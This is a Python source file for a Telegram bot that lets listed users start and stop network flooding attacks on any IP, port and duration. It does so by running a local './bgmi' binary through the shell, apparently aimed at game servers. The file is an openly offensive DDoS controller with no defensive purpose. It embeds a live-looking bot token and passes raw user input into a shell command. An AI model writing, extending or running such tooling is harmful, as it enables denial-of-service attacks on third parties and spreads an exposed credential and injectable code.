import telebot
import subprocess
import os
import signal

# Initialize the bot with your bot token
TOKEN = '7467657976:AAH-Giq8OmJbyU8llL_aBWupD0WM2g41Kx0'
bot = telebot.TeleBot(TOKEN)

# Global variables
current_attack_process = None
waiting_for_attack_details = False  # To track when we are expecting input
allowed_users = ['6255431752', 'SECOND-USER-ID']  # Replace with actual Telegram user IDs
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Function to check if the user is allowed
def is_user_allowed(user_id):
    return str(user_id) in allowed_users

# Start attack command (button pressed)
@bot.message_handler(func=lambda message: message.text == "Start Attack 🚀")
def start_attack(message):
    global waiting_for_attack_details
    user_id = message.from_user.id
    if not is_user_allowed(user_id):
        bot.reply_to(message, "You are not authorized to use this bot.")
        return
    
    waiting_for_attack_details = True  # Now expect IP, port, and duration
    bot.reply_to(message, "Please send the target IP, port, and duration (space-separated).")

# Handle user input for IP, port, and duration
@bot.message_handler(func=lambda message: waiting_for_attack_details and message.text.count(' ') == 2)
def handle_attack_input(message):
    global current_attack_process, waiting_for_attack_details

    user_id = message.from_user.id
    if not is_user_allowed(user_id):
        bot.reply_to(message, "You are not authorized to use this bot.")
        return

    if waiting_for_attack_details:
        try:
            ip, port, duration = message.text.split()
            port = int(port)
            duration = int(duration)

            if port in blocked_ports:
                bot.reply_to(message, "Blocked ports are entered. Please verify and send working ports.")
                return

            command = f"./bgmi {ip} {port} {duration} 99"

            # Execute the attack
            current_attack_process = subprocess.Popen(command, shell=True, preexec_fn=os.setsid)
            bot.reply_to(message, f"Attack started on {ip}:{port} for {duration} seconds.")

            waiting_for_attack_details = False

        except Exception as e:
            bot.reply_to(message, f"Error starting attack: {str(e)}")
            waiting_for_attack_details = False

# Stop attack command
@bot.message_handler(func=lambda message: message.text == "Stop Attack 🛑")
def stop_attack(message):
    global current_attack_process

    user_id = message.from_user.id
    if not is_user_allowed(user_id):
        bot.reply_to(message, "You are not authorized to use this bot.")
        return

    if current_attack_process:
        try:
            os.killpg(os.getpgid(current_attack_process.pid), signal.SIGTERM)
            current_attack_process.wait()  # Wait for the process to terminate
            current_attack_process = None
            bot.reply_to(message, "Attack stopped successfully.")
        except Exception as e:
            bot.reply_to(message, f"Error stopping attack: {str(e)}")
    else:
        bot.reply_to(message, "No attack is currently running.")

# Create a button menu for the bot
def send_main_menu(chat_id):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn_attack = telebot.types.KeyboardButton("Start Attack 🚀")
    btn_stop = telebot.types.KeyboardButton("Stop Attack 🛑")
    markup.add(btn_attack, btn_stop)
    bot.send_message(chat_id, "Choose an option:", reply_markup=markup)

# Handle '/start' command and show the button menu
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    if is_user_allowed(user_id):
        send_main_menu(message.chat.id)
    else:
        bot.reply_to(message, "You are not authorized to use this bot.")

# Poll the bot to receive messages
bot.polling()
